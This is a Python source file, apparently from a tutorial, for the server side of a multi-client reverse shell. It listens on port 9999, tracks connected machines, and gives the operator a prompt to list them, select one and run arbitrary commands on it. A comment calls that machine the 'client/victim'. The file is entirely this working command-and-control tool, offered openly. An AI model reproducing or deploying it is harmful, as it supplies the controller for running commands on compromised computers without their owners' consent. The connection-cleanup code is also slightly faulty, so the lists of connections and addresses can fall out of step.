# Multi Client
import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2 # first thread for listen and accept connections from other clients
# second for sending commands to an already connected client 
JOB_NUMBER = [1, 2] # 1 is first thread and 2 is second thread, so job number is actually thread number
queue = Queue() 
all_connections = []
all_address = [] # for ip address and port number

# 1st thread functions : 
# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999 # uncommon port no.
        s = socket.socket() # checking whether the socket is created or not

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5) # 5 is no of bad connection allowed

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


# 2nd thread functions :
# 1) See all the clients
# 2) Select a client 
# 3) Send commands to the connected client
# Interactive prompt for sending commands

def start_shell():

    while True:
        cmd = input('shell > ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


# Display all current active connections with client
def list_connections():
    results = ''
    print("----Clients----" + "\n" )
    for i, conn in enumerate(all_connections):
        try: # checking  whether the connection is still active by sending a dummy command 
            conn.send(str.encode(' '))
            conn.recv(20480) # 20480 is byte chunk size
        except:
          
            del all_address[i]
            continue
    # all_address[][0] is ip address & all_address[][1] is port
        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
        print(results)

   


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # <ip_address> > dir

    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024),"utf-8")  #1024 is chunk size
            print(client_response, end="") #to move cursor to next line 
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work) #creating thread
        t.daemon = True # The Daemon Thread does not block the main thread from exiting and continues to run in the background
        # daemon make sure that threads also get deleted when program execution stops
        t.start() # starting the thread


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1: # if the job number in queue is 1 then handle connectioons 
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2: # if the job number in queue is 2 then send commands 
            start_shell()

        queue.task_done() 

# storing jobs in the queue because threads look for jobs in a queue and not in lists
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()
    

create_workers()
create_jobs()
